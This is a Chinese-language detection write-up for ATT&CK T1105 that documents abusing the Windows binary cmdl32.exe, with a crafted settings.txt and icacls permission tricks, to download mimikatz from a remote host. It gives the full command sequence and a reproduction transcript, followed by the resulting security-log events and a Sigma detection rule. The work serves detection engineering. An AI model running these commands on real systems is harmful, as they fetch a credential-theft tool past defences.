# T1105-Win-利用cmdl32进行文件下载行为(白名单)

## 来自ATT&CK的描述

攻击者可能会将工具或其他文件从外部系统转移到被攻陷的环境中。可以通过命令控制通道从外部攻击者控制的系统中复制文件，以便将工具带入被攻陷的网络环境中，或通过与另一个工具（如FTP）的替代协议复制文件。文件也可以在Mac和Linux上使用scp、rsync和sftp等本机工具进行复制。

## 测试案例

cmdl32.exe,CMAK（连接管理器管理工具包）使用它来设置连接管理器服务配置文件。配置文件通常打包成一个.exe，可以部署到用户系统。该软件包安装可用于启动拨号/VPN连接的配置文件。

### 步骤一

使用以下命令并且生成相关配置文件。

```yml
icacls %cd% /deny %username%:(OI)(CI)(DE,DC)
set tmp=%cd%
echo [Connection Manager] > settings.txt
echo CMSFile=settings.txt >> settings.txt
echo ServiceName=WindowsUpdate >> settings.txt
echo TunnelFile=settings.txt  >> settings.txt
echo [Settings]  >> settings.txt
echo UpdateUrl=http://10.211.55.2:8000/mimikatz.exe  >> settings.txt
```

### 步骤二

然后继续执行即可下载成功。

```yml
cmdl32 /vpn /lan %cd%\settings.txt
icacls %cd% /remove:d %username%
move VPNBDFF.tmp mimikatz.exe
```

## 检测日志

windows安全日志、其他EDR类产品

## 测试复现

windows server 2016进行测试，测试效果Ok。

```yml
C:\Users\Administrator>cd C:\Users\Administrator\Desktop\test

C:\Users\Administrator\Desktop\test>icacls %cd% /deny %username%:(OI)(CI)(DE,DC)
已处理的文件: C:\Users\Administrator\Desktop\test
已成功处理 1 个文件; 处理 0 个文件时失败

C:\Users\Administrator\Desktop\test>set tmp=%cd%

C:\Users\Administrator\Desktop\test>echo [Connection Manager] > settings.txt

C:\Users\Administrator\Desktop\test>echo CMSFile=settings.txt >> settings.txt

C:\Users\Administrator\Desktop\test>echo ServiceName=WindowsUpdate >> settings.txt

C:\Users\Administrator\Desktop\test>echo TunnelFile=settings.txt  >> settings.txt

C:\Users\Administrator\Desktop\test>echo [Settings]  >> settings.txt

C:\Users\Administrator\Desktop\test>echo UpdateUrl=http://10.211.55.2:8000/mimikatz.exe  >> settings.txt

C:\Users\Administrator\Desktop\test>cmdl32 /vpn /lan %cd%\settings.txt

C:\Users\Administrator\Desktop\test>icacls %cd% /remove:d %username%
已处理的文件: C:\Users\Administrator\Desktop\test
已成功处理 1 个文件; 处理 0 个文件时失败

C:\Users\Administrator\Desktop\test>move VPND1F2.tmp mimikatz.exe
移动了         1 个文件。
```

## 测试留痕

### 日志记录1

```log
创建新进程。4688，windows安全日志

创建者主题:
 安全 ID:  QAX\Administrator
 帐户名:  Administrator
 帐户域:  QAX
 登录 ID:  0xCF2BF2

目标主题:
 安全 ID:  NULL SID
 帐户名:  -
 帐户域:  -
 登录 ID:  0x0

进程信息:
 新进程 ID:  0x40e0
 新进程名称: C:\Windows\System32\icacls.exe
 令牌提升类型: %%1936
 强制性标签:  Mandatory Label\High Mandatory Level
 创建者进程 ID: 0x688
 创建者进程名称: C:\Windows\System32\cmd.exe
 进程命令行: icacls  C:\Users\wangxin\Desktop\test /deny Administrator:(OI)(CI)(DE,DC)
```

### 日志记录二

```log
已创建新进程。

创建者主题:
 安全 ID:  QAX\Administrator
 帐户名:  Administrator
 帐户域:  QAX
 登录 ID:  0xCF2BF2

目标主题:
 安全 ID:  NULL SID
 帐户名:  -
 帐户域:  -
 登录 ID:  0x0

进程信息:
 新进程 ID:  0x12c18
 新进程名称: C:\Windows\System32\cmdl32.exe
 令牌提升类型: %%1936
 强制性标签:  Mandatory Label\High Mandatory Level
 创建者进程 ID: 0x688
 创建者进程名称: C:\Windows\System32\cmd.exe
 进程命令行: cmdl32  /vpn /lan C:\Users\wangxin\Desktop\test\settings.txt
```

### 日志记录三

```log
已创建新进程。

创建者主题:
 安全 ID:  QAX\Administrator
 帐户名:  Administrator
 帐户域:  QAX
 登录 ID:  0xE991EB

目标主题:
 安全 ID:  NULL SID
 帐户名:  -
 帐户域:  -
 登录 ID:  0x0

进程信息:
 新进程 ID:  0x133b8
 新进程名称: C:\Windows\System32\icacls.exe
 令牌提升类型: %%1936
 强制性标签:  Mandatory Label\High Mandatory Level
 创建者进程 ID: 0x12fac
 创建者进程名称: C:\Windows\System32\cmd.exe
 进程命令行: icacls  C:\Users\wangxin\Desktop\test /remove:d Administrator
```

## 检测规则/思路

### sigma规则

```yml

title: Windows下利用cmdl32进行文件下载行为
status: experimental
description:  cmdl32.exe,CMAK（连接管理器管理工具包）使用它来设置连接管理器服务配置文件。配置文件通常打包成一个.exe，可以部署到用户系统。该软件包安装可用于启动拨号/VPN连接的配置文件。攻击者可以利用cmdl32进行简单的文件传输活动。
references:
    - https://www.t00ls.cc/thread-63254-1-1.html
tags:
    - attack.command_and_control
    - attack.execution
    - attack.t1105
logsource:
    product: windows #windows
    service: process_creation #安全事件，进程创建
detection:
    selection:
        ProcessCommandline|contains|all: #进程命令行参数包含以下任意一项
            - 'settings.txt'
        Image|endswith: 
            - 'cmdl32.exe' #进程路径为以wuauclt.exe
    condition: selection
falsepositives:
    - Unknown
level: high
```

### 建议

低版本操作系统无法记录命令行参数及子父进程，建议通过Sysmon进行监控。

## 相关TIP
[[T1105-win-命令提示符网络链接]]
[[T1105-Windows Update可滥用于执行恶意程序行为检测]]
[[T1105-win-入口工具转移-AppInstaller.exe(白名单、失效)]]

## 参考推荐

MITRE-ATT&CK-T1105

<https://attack.mitre.org/techniques/T1105>

cmdl32代替certutil.exe

<https://www.t00ls.cc/thread-63254-1-1.html>
